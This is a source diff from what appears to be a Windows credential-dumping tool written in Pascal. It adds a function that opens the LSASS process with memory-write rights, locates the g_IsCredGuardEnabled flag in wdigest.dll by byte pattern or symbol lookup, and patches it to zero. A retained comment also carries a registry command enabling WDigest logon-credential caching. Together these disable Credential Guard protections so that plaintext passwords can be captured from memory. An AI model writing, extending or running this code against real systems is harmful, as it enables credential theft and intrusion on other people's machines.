@@ -14,7 +14,8 @@ function encryptLSA(cbmemory:ulong;decrypted:array of byte;var encrypted:tbytes)
 function findlsakeys(pid:dword;var DesKey,aeskey,iv:tbytes):boolean;
 
 function wdigest(pid:dword):boolean;
-function wdigest_on(pid:dword):boolean;
+function wdigest_UseLogonCredential(pid:dword):boolean;
+function wdigest_DisableCredGuard(pid:dword):boolean;
 
 function dpapi(pid:dword):boolean;
 
@@ -1035,7 +1036,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 to query...
 reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
 }
-function wdigest_on(pid:dword):boolean;
+function wdigest_UseLogonCredential(pid:dword):boolean;
 const
 
   //dd wdigest!g_fParameter_UseLogonCredential in windbg
@@ -1153,6 +1154,113 @@ result:=false;
         ReadMem (hprocess,offset,@dw,4);
         log('g_fParameter_UseLogonCredential value:'+inttostr(ByteSwap32(dw)));
         dw:=ByteSwap32 (1);
+        writemem(hprocess,offset,@dw,4);
+        result:=true;
+
+    closehandle(hprocess);
+    end;
+
+
+end;
+
+//g_IsCredGuardEnabled -> set to 0
+function wdigest_disableCredGuard(pid:dword):boolean;
+const
+
+  //dd wdigest!g_IsCredGuardEnabled in windbg
+  //or
+  //search g_IsCredGuardEnabled in IDA  (spacceptcredentials)
+  //look for cmp     cs:g_IsCredGuardEnabled, ebx
+  //which translates to 39 1D F5  14 03 00
+  //F5  14 03 00 is your offset (from current pos) to g_fParameter_UseLogonCredential
+  //or we could maintain a table of offsets per windows versions...
+  PTRN_WIN10_1xxx_IsCredGuardEnabled:array [0..14] of byte=  ($F7,$47,$50,$00,$08,$00,$00,$0F,$85,$E2,$71,$00,$00,$39,$1D);
+
+var
+  module:string='wdigest.dll';
+  hprocess:thandle;
+  offset_dword:dword;
+  offset:nativeuint=0;
+  patch_pos:ShortInt=0;
+  pattern:tbytes; //array of byte;
+  dw:dword;
+begin
+result:=false;
+  if pid=0 then exit;
+  //
+  if (lowercase(osarch)='amd64') then
+     begin
+        if pos('-1903',winver)>0 then
+        begin
+        setlength(pattern,sizeof(PTRN_WIN10_1xxx_IsCredGuardEnabled));
+        copymemory(@pattern[0],@PTRN_WIN10_1xxx_IsCredGuardEnabled[0],sizeof(PTRN_WIN10_1xxx_IsCredGuardEnabled));
+        patch_pos:=4;
+        end;
+     end; //if (lowercase(osarch)='amd64') then
+
+
+  //if lowercase(getenv('g_fParameter_UseLogonCredential'))<>'' then
+  if symmode=true then
+     begin
+     //patch_pos:=-1;
+     //offset:=int64(strtoint('$'+getenv('g_fParameter_UseLogonCredential')));
+     //log('env g_fParameter_UseLogonCredential:'+inttohex(offset,sizeof(offset)));
+       try
+       if _SymFromName (strpas(sysdir)+'\'+module,'g_IsCredGuardEnabled',offset)
+          then
+             begin
+             log('_SymFromName:'+inttohex(offset,sizeof(offset)));
+             patch_pos:=-1;
+             end
+          else log('_SymFromName:failed');
+       except
+       on e:exception do log(e.Message );
+       end;
+     end;
+
+  if patch_pos =0 then
+     begin
+     log('no patch mod for this windows version',1);
+     exit;
+     end;
+  log('patch pos:'+inttostr(patch_pos ),0);
+  //
+  if search_module_mem (pid,module,pattern,offset)=false then
+     begin
+     log('search_module_mem NOT OK');
+     exit;
+     end;
+  //
+  if offset=0 then exit;
+  log('found:'+inttohex(offset,sizeof(pointer)),0);
+  //
+    hprocess:=thandle(-1);
+    hprocess:=openprocess( PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_QUERY_INFORMATION,
+                                        false,pid);
+    if hprocess<>thandle(-1) then
+    begin
+    log('openprocess ok',0);
+
+    if patch_pos =-1 then //relative offset was provided
+        begin
+        //nothing to do here...
+        end;
+
+    if patch_pos <>-1 then  //some more work to find the relative offset
+    if ReadMem  (hprocess,offset+sizeof(PTRN_WIN10_1xxx_IsCredGuardEnabled),@offset_dword,4) then
+        begin
+        //CopyMemory(@offset_dword,@offset_byte[0],4);
+        log('ReadProcessMemory OK '+inttohex(offset_dword,4));
+        offset:=offset+sizeof(PTRN_WIN10_1xxx_IsCredGuardEnabled)+offset_dword+patch_pos;
+        end; //if readmem
+
+        //finally do the work
+        //we now should get a match with dd wdigest!g_fParameter_UseLogonCredential
+        log('g_IsCredGuardEnabled offset:'+inttohex(offset,sizeof(pointer)));
+        //dw:=0;
+        ReadMem (hprocess,offset,@dw,4);
+        log('g_IsCredGuardEnabled value:'+inttostr(ByteSwap32(dw)));
+        dw:=ByteSwap32 (0);
         writemem(hprocess,offset,@dw,4);
         result:=true;
 
